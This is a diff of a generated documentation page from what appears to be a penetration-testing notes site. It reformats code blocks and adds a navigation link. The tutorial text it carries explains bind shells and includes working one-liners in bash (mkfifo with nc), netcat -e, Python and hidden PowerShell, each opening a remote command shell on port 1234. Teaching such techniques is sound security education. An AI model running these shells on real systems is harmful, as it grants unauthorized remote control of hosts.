@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17125,44 +17148,60 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </details>
 <p>In a bind-shell the attacking machine initiates a connection to a listener port on the victim's machine. </p>
 <p>A basic connection (not a bind shell as there is no interaction with the OS and file system) would be:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a># Listener listening in the victim&#39;s machine, the target
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nc -lvnp $port
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a># Attacker&#39;s machine making the connection
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>nc -nv $ipVictim $port
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span>
+<span class="normal"><a href="#__codelineno-0-4">4</a></span>
+<span class="normal"><a href="#__codelineno-0-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a># Listener listening in the victim&#39;s machine, the target
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>nc -lvnp $port
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a># Attacker&#39;s machine making the connection
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>nc -nv $ipVictim $port
+</span></code></pre></div></td></tr></table></div>
 <h2 id="bind-shell-connections">Bind shell connections</h2>
 <p><strong>First step</strong> in this attack is always initiating the listening connection on port $port on the victim's machine,  IP $ipVictim.</p>
 <h3 id="bash">bash</h3>
 <p>We had complete control over both our attack box and the target system;</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># From the victim&#39;s machine</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span><span class="nv">$ipVictim</span><span class="w"> </span><span class="nv">$port</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/f
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1">### nc -l $ipVictim $port -&gt; This binds to a specific IP address (denoted by `$ipVictim`). This is useful in multi-homed systems where the machine has more than one network interface, and you want to bind netcat to a particular IP address/interface.</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># From the attacker machine</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>nc<span class="w"> </span>-nv<span class="w"> </span><span class="nv">$ipVictim</span><span class="w"> </span><span class="nv">$port</span>
-</span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># From the victim&#39;s machine</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/bash<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="nv">$port</span><span class="w"> </span>&gt;/tmp/f
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1">### nc -lvp $port  -&gt; This binds to any available network interface on the machine. It listens on the specified port, but it will accept connections on all network interfaces (e.g., localhost, LAN IP, etc.), which might be less restrictive.</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># From the attacker machine</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>nc<span class="w"> </span>-nv<span class="w"> </span><span class="nv">$ipVictim</span><span class="w"> </span><span class="nv">$port</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1"># From the victim&#39;s machine</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/bash<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span><span class="nv">$ipVictim</span><span class="w"> </span><span class="nv">$port</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/f
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="c1">### nc -l $ipVictim $port -&gt; This binds to a specific IP address (denoted by `$ipVictim`). This is useful in multi-homed systems where the machine has more than one network interface, and you want to bind netcat to a particular IP address/interface.</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="c1"># From the attacker machine</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>nc<span class="w"> </span>-nv<span class="w"> </span><span class="nv">$ipVictim</span><span class="w"> </span><span class="nv">$port</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span>
+<span class="normal"><a href="#__codelineno-2-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="c1"># From the victim&#39;s machine</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/bash<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="nv">$port</span><span class="w"> </span>&gt;/tmp/f
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="c1">### nc -lvp $port  -&gt; This binds to any available network interface on the machine. It listens on the specified port, but it will accept connections on all network interfaces (e.g., localhost, LAN IP, etc.), which might be less restrictive.</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="c1"># From the attacker machine</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>nc<span class="w"> </span>-nv<span class="w"> </span><span class="nv">$ipVictim</span><span class="w"> </span><span class="nv">$port</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="netcat">netcat</h3>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">nc -lvp 1234 -e /bin/bash</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go">nc -lvp 1234 -e /bin/bash</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="python">python</h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();</span><span class="se">\n</span><span class="s1">while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();</span><span class="se">\n</span><span class="s1">while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="powershell">powershell</h3>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">powershell</span> <span class="n">-NoP</span> <span class="n">-NonI</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="n">-Command</span> <span class="nv">$listener</span> <span class="p">=</span> <span class="no">[System.Net.Sockets.TcpListener]</span><span class="n">1234</span><span class="p">;</span> <span class="nv">$listener</span><span class="p">.</span><span class="n">start</span><span class="p">();</span><span class="nv">$client</span> <span class="p">=</span> <span class="nv">$listener</span><span class="p">.</span><span class="n">AcceptTcpClient</span><span class="p">();</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="n">powershell</span> <span class="n">-NoP</span> <span class="n">-NonI</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="n">-Command</span> <span class="nv">$listener</span> <span class="p">=</span> <span class="no">[System.Net.Sockets.TcpListener]</span><span class="n">1234</span><span class="p">;</span> <span class="nv">$listener</span><span class="p">.</span><span class="n">start</span><span class="p">();</span><span class="nv">$client</span> <span class="p">=</span> <span class="nv">$listener</span><span class="p">.</span><span class="n">AcceptTcpClient</span><span class="p">();</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>Second step</strong>:  If we have succeeded in previous step, we have a shell waiting for us on the specified port (1234) in the victim's machine. Now, let's  connect to it from our attacking machine:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nc 10.10.10.1 1234
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a># 10.10.10.1 would be the victim&#39;s machine
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a># 1234 would be the listening port on victim&#39;s machine
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>nc 10.10.10.1 1234
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a># 10.10.10.1 would be the victim&#39;s machine
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a># 1234 would be the listening port on victim&#39;s machine
+</span></code></pre></div></td></tr></table></div>
 <p>Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.</p>
 <h2 id="some-more-resources">Some more resources</h2>
 <table>
@@ -17254,7 +17293,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
